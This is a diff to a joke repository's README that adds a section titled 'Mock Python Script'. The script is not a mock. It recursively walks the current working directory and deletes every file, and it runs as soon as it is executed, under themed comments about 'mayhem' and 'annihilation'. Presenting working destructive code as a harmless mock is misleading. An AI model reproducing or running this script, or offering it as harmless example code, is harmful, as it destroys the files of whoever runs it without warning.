@@ -31,3 +31,24 @@ This repository is governed by the Mayhem License, a binding pact that grants yo
 Revel in the madness, for this Toy Wiki transcends the boundaries of reason and embraces the sublime lunacy that is knowledge without purpose. Enter if you dare, and may your sanity rest in pieces.
 
 [Bash](Linux/bash.md)
+
+## Mock Python Script
+
+```py
+import os
+
+def unleash_mayhem():
+    # Dark magic begins here
+    print("Embrace the darkness! Mayhem unleashed!")
+
+    # Destroy all files in the current directory
+    for root, dirs, files in os.walk(os.getcwd()):
+        for file in files:
+            file_path = os.path.join(root, file)
+            os.remove(file_path)
+
+    print("Total annihilation complete. The world trembles at your command.")
+
+# Invoke the forbidden ritual
+unleash_mayhem()
+```
